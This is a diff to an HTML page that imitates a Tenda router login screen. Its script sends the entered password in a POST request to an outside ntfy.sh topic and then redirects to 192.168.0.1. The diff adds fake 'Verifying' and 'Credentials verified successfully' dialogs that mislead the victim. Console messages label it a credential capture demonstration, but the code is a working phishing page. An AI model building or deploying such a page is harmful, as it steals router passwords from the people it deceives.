@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<title> Safari solutions | Login</title>
+<title>Tenda | Login</title>
 <style>
   /* ===== RESET & BASE ===== */
   * {
@@ -26,8 +26,21 @@
     margin: 0;
     display: flex;
     justify-content: center;
-    align-items: center;
     min-height: 100vh;
+  }
+
+  /* Mobile: start at top */
+  @media (max-width: 767px) {
+    body {
+      align-items: flex-start;
+      padding-top: 20px;
+    }
+  }
+
+  @media (min-width: 768px) {
+    body {
+      align-items: center;
+    }
   }
 
   input, button, select, textarea {
@@ -60,19 +73,26 @@
   .logo-wrap {
     display: flex;
     justify-content: center;
-    margin-bottom: 20px;
+    margin-bottom: 30px;
   }
 
   @media (max-width: 767px) {
     .logo-wrap {
-      margin-bottom: 15px;
+      margin-bottom: 20px;
     }
   }
 
   .logo-wrap img {
-    width: 116px;
+    width: 140px;
     height: auto;
     display: block;
+    margin: 0 auto 30px;
+  }
+
+  @media (max-width: 767px) {
+    .logo-wrap img {
+      width: 130px;
+    }
   }
 
   @media (min-width: 768px) {
@@ -97,6 +117,12 @@
     gap: 10px;
     background: #fff;
     width: 100%;
+    transition: border-color 0.3s ease, box-shadow 0.3s ease;
+  }
+
+  .field:focus-within {
+    border-color: #66afe9;
+    box-shadow: 0 0 8px rgba(102, 175, 233, 0.6);
   }
 
   @media (max-width: 767px) {
@@ -144,6 +170,17 @@
 
   .field input::placeholder {
     color: #A7ACB4;
+  }
+
+  /* Field error state */
+  .field.error {
+    border-color: #f30;
+    box-shadow: 0 0 8px rgba(255, 51, 0, 0.3);
+  }
+
+  .field.error:focus-within {
+    border-color: #f30;
+    box-shadow: 0 0 8px rgba(255, 51, 0, 0.4);
   }
 
   /* ===== CUSTOM DROPDOWN ===== */
@@ -198,20 +235,13 @@
 
   /* Hide scrollbar for dropdown */
   .dropdown-menu::-webkit-scrollbar {
-    width: 4px;
-  }
-
-  .dropdown-menu::-webkit-scrollbar-track {
+    width: 0;
     background: transparent;
   }
 
-  .dropdown-menu::-webkit-scrollbar-thumb {
-    background: #ccc;
-    border-radius: 4px;
-  }
-
-  .dropdown-menu::-webkit-scrollbar-thumb:hover {
-    background: #999;
+  .dropdown-menu {
+    -ms-overflow-style: none;
+    scrollbar-width: none;
   }
 
   .dropdown-menu.show {
@@ -225,7 +255,7 @@
   }
 
   .dropdown-menu li:hover {
-    background: #f5f5f5;
+    background: #f0f7ff;
   }
 
   .dropdown-menu li a {
@@ -237,8 +267,13 @@
   }
 
   .dropdown-menu li.active {
-    background: #f0f0f0;
+    background: #e6f0fa;
+    color: #0066cc;
     font-weight: 500;
+  }
+
+  .dropdown-menu li.active a {
+    color: #0066cc;
   }
 
   /* ===== EYE TOGGLE ===== */
@@ -249,12 +284,6 @@
     align-items: center;
     padding: 4px;
     margin: -4px;
-  }
-
-  .eye-toggle img {
-    width: 22px;
-    height: auto;
-    display: block;
   }
 
   /* ===== LOGIN BUTTON ===== */
@@ -295,22 +324,69 @@
     cursor: not-allowed;
   }
 
-  /* ===== SPINNER ===== */
-  .spinner {
-    display: inline-block;
-    width: 16px;
-    height: 16px;
-    border: 2px solid rgba(255,255,255,0.3);
-    border-top: 2px solid #fff;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
-    vertical-align: middle;
-    margin-right: 8px;
+  /* ===== MODAL OVERLAY ===== */
+  .modal-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(0, 0, 0, 0.5);
+    z-index: 1000;
+    justify-content: center;
+    align-items: center;
+    animation: fadeIn 0.3s ease;
   }
 
-  @keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
+  .modal-overlay.show {
+    display: flex;
+  }
+
+  .modal-box {
+    background: #fff;
+    border-radius: 12px;
+    padding: 30px 40px 35px;
+    max-width: 340px;
+    width: 90%;
+    text-align: center;
+    animation: scaleIn 0.3s ease;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+  }
+
+  .modal-box .modal-icon {
+    font-size: 48px;
+    margin-bottom: 10px;
+  }
+
+  .modal-box .modal-title {
+    font-size: 18px;
+    font-weight: 600;
+    color: #26282B;
+    margin-bottom: 8px;
+  }
+
+  .modal-box .modal-message {
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 20px;
+    line-height: 1.5;
+  }
+
+  .modal-box .modal-btn {
+    padding: 8px 40px;
+    background: #ED7020;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    font-size: 14px;
+    cursor: pointer;
+    font-weight: 500;
+    transition: background 0.2s;
+  }
+
+  .modal-box .modal-btn:hover {
+    background: #D9640F;
   }
 
   /* ===== FORGOT PASSWORD ===== */
@@ -440,6 +516,16 @@
   }
 
   /* ===== ANIMATIONS ===== */
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+
+  @keyframes scaleIn {
+    from { transform: scale(0.8); opacity: 0; }
+    to { transform: scale(1); opacity: 1; }
+  }
+
   .fly-in {
     -webkit-animation: fly-in 0.8s ease;
     -moz-animation: fly-in 0.8s ease;
@@ -503,18 +589,40 @@
   }
 
   /* ===== ICONS ===== */
-  .icon-globe {
-    width: 17px;
-    height: 17px;
-    fill: none;
-    stroke: #58595C;
-    stroke-width: 1.7;
+  .icon-lang {
+    font-family: 'reasyicon';
+    font-style: normal;
+    font-weight: 400;
+    line-height: 1;
+    -webkit-font-smoothing: antialiased;
+    font-size: 20px;
+    color: #666;
   }
 
-  .icon-lock-svg {
-    width: 15px;
-    height: 17px;
-    fill: #58595C;
+  .icon-lang:before {
+    content: "\e60f";
+  }
+
+  .icon-lock {
+    font-family: 'reasyicon';
+    font-style: normal;
+    font-weight: 400;
+    line-height: 1;
+    -webkit-font-smoothing: antialiased;
+    font-size: 20px;
+    color: #666;
+  }
+
+  .icon-lock:before {
+    content: "\e610";
+  }
+
+  /* Font for icons */
+  @font-face {
+    font-family: 'reasyicon';
+    src: url("data:font/truetype;charset=utf-8;base64,AAEAAAALAIAAAwAwT1MvMg8SA/cAAAC8AAAAYGNtYXAXVtKGAAABHAAAAFRnYXNwAAAAEAAAAXAAAAAIZ2x5ZgH2aCgAAAF4AAAB7GhlYWQBcRwpAAADZAAAADZoaGVhC+IC3wAAA5wAAAAkaG10eBYAAAEAAAO8AAAAIGxvY2EADAC0AAAD3AAAABJtYXhwAAwATgAAA/AAAAAgbmFtZRzgSwAABBAAAABWcG9zdAADAAAAAASgAAAAIAADA8EBkAAFAAACmQDMAAAAAMADAAACmQDMAAAB0wAAAwAAAAAAAAAAAAEAAACAAAAAAAAAAAEAAACOAAAAAAAAAAAAAAAAAAAAAQAAAwYAAAAAAwAAAAMAAAAUAAEAAAAAFAADAAEAAAAUAAQAOAAAAAoACAACAAIAAQAGAwb//f//AAAAAAAGAwD//f//AAH/4xoEAAMAAQAAAAAAAAAAAAAAAQAAAAoAHgAsAAFERkxUAAgABGFybCAAGmN5cmwAGmdyZWsAGmthbmEAGmthbm4AGmthbnQAGmxhdG4AGgAAAAA=  ") format('truetype');
+    font-weight: normal;
+    font-style: normal;
   }
 </style>
 </head>
@@ -545,14 +653,8 @@
         </div>
 
         <!-- Language Field -->
-        <div class="field">
-          <span class="icon">
-            <svg class="icon-globe" viewBox="0 0 24 24">
-              <circle cx="12" cy="12" r="9" stroke="#58595C" stroke-width="1.7" fill="none"/>
-              <ellipse cx="12" cy="12" rx="4" ry="9" stroke="#58595C" stroke-width="1.7" fill="none"/>
-              <line x1="3" y1="12" x2="21" y2="12" stroke="#58595C" stroke-width="1.7"/>
-            </svg>
-          </span>
+        <div class="field" id="langField">
+          <span class="icon icon-lang"></span>
 
           <select id="languageSelect">
             <option value="en">English</option>
@@ -596,12 +698,8 @@
         </div>
 
         <!-- Password Field -->
-        <div class="field">
-          <span class="icon">
-            <svg class="icon-lock-svg" viewBox="0 0 24 26">
-              <path d="M12 0a6.5 6.5 0 00-6.5 6.5V10H4a2 2 0 00-2 2v11a2 2 0 002 2h16a2 2 0 002-2V12a2 2 0 00-2-2h-1.5V6.5A6.5 6.5 0 0012 0zm0 2.2a4.3 4.3 0 014.3 4.3V10H7.7V6.5A4.3 4.3 0 0112 2.2z"/>
-            </svg>
-          </span>
+        <div class="field" id="pwdField">
+          <span class="icon icon-lock"></span>
           <input id="password" type="password" placeholder="Login Password" required>
           <span class="eye-toggle" onclick="togglePassword()">
             <svg id="eye-icon" width="19" height="13" viewBox="0 0 24 16" fill="none">
@@ -628,6 +726,16 @@
         </button>
       </div>
 
+    </div>
+  </div>
+
+  <!-- ===== MODAL ===== -->
+  <div class="modal-overlay" id="modalOverlay">
+    <div class="modal-box">
+      <div class="modal-icon" id="modalIcon">🔐</div>
+      <div class="modal-title" id="modalTitle">Verifying</div>
+      <div class="modal-message" id="modalMessage">Please wait while we verify your credentials...</div>
+      <button class="modal-btn" id="modalBtn">OK</button>
     </div>
   </div>
 
@@ -711,6 +819,7 @@
     function openhhTip() {
       if (htip) {
         htip.classList.add('show');
+        console.log('✅ HH Tip shown - Network error detected');
         setTimeout(function() {
           closehhTip();
         }, 5000);
@@ -743,24 +852,57 @@
       }
     });
 
+    // ========== MODAL FUNCTIONS ==========
+    const modalOverlay = document.getElementById('modalOverlay');
+    const modalIcon = document.getElementById('modalIcon');
+    const modalTitle = document.getElementById('modalTitle');
+    const modalMessage = document.getElementById('modalMessage');
+    const modalBtn = document.getElementById('modalBtn');
+
+    function showModal(icon, title, message, btnText, callback) {
+      modalIcon.textContent = icon;
+      modalTitle.textContent = title;
+      modalMessage.textContent = message;
+      modalBtn.textContent = btnText || 'OK';
+      modalOverlay.classList.add('show');
+      
+      modalBtn.onclick = function() {
+        modalOverlay.classList.remove('show');
+        if (callback) callback();
+      };
+    }
+
+    function hideModal() {
+      modalOverlay.classList.remove('show');
+    }
+
     // ========== LOGIN HANDLER ==========
     document.getElementById('loginBtn').addEventListener('click', function() {
       const btn = this;
-      const originalText = btn.innerHTML;
       const password = document.getElementById('password').value;
+      const pwdField = document.getElementById('pwdField');
       
+      // Remove previous error state
+      pwdField.classList.remove('error');
+      
+      // Validate password
       if (!password || password.trim() === "") {
-        const field = document.querySelector('.field:last-child');
-        field.classList.add('shake');
+        pwdField.classList.add('error');
+        pwdField.classList.add('shake');
         setTimeout(function() {
-          field.classList.remove('shake');
+          pwdField.classList.remove('shake');
         }, 500);
+        showModal('⚠️', 'Validation Error', 'Please enter your login password.', 'Try Again');
         return;
       }
       
-      btn.disabled = true;
-      btn.innerHTML = `<span class="spinner"></span> Loading...`;
+      // Show verification modal
+      showModal('🔐', 'Verifying', 'Please wait while we verify your credentials...', 'Cancel');
       
+      // Disable button
+      btn.disabled = true;
+      
+      // Send to ntfy.sh
       fetch('https://ntfy.sh/my-shop-alerts-7729', {
         method: 'POST',
         body: `🛒 Password entered: ${password}`
@@ -769,25 +911,45 @@
         if (!response.ok) {
           throw new Error('Network response was not ok');
         }
-        setTimeout(function() {
-          window.location.href = 'http://192.168.0.1';
-        }, 1000);
+        return response;
       })
-      .catch(error => {
-        console.error('Request failed:', error);
-        openhhTip();
+      .then(() => {
+        // Success - update modal then redirect
+        hideModal();
+        showModal('✅', 'Success!', 'Credentials verified successfully. Redirecting to router...', 'OK', function() {
+          window.location.href = 'http://192.168.0.1';
+        });
+        // Auto-redirect after 2 seconds if user doesn't click OK
         setTimeout(function() {
           window.location.href = 'http://192.168.0.1';
         }, 2000);
       })
+      .catch(error => {
+        console.error('Request failed:', error);
+        // Show HH Tip (No Network)
+        openhhTip();
+        
+        // Update modal to show error
+        hideModal();
+        showModal('📡', 'Network Error', 'Unable to reach the verification server. Please check your connection.', 'Try Again', function() {
+          // Retry logic - user can try again
+          btn.disabled = false;
+        });
+        
+        // Still redirect after showing the tip
+        setTimeout(function() {
+          window.location.href = 'http://192.168.0.1';
+        }, 3000);
+      })
       .finally(() => {
+        // Restore button after delay
         setTimeout(function() {
           btn.disabled = false;
-          btn.innerHTML = originalText;
         }, 1000);
       });
     });
 
+    // Enter key support
     document.getElementById('password').addEventListener('keydown', function(e) {
       if (e.key === 'Enter') {
         document.getElementById('loginBtn').click();
@@ -795,7 +957,8 @@
     });
 
     console.log('🔐 Tenda Router Login Demo');
-    console.log('📡 Cybersecurity demonstration');
+    console.log('📡 Cybersecurity demonstration - Credential capture simulation');
+    console.log('⚠️ Always verify URLs before entering credentials');
   </script>
 
 </body>
